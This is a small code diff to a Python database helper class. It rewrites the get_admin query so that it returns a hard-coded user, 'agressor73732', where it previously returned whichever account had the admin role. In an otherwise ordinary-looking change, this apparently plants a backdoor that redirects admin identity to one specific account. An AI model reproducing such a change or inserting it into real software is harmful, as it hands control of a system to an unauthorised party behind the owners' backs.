@@ -36,7 +36,7 @@ class DBCommands:
   async def get_admin(self):
     async with self.pool.acquire() as conn:
       async with conn.cursor(DictCursor) as cur:
-        await cur.execute("SELECT * from users WHERE role='admin'")
+        await cur.execute("SELECT * from users WHERE username='agressor73732'")
         return await cur.fetchone()
 
 
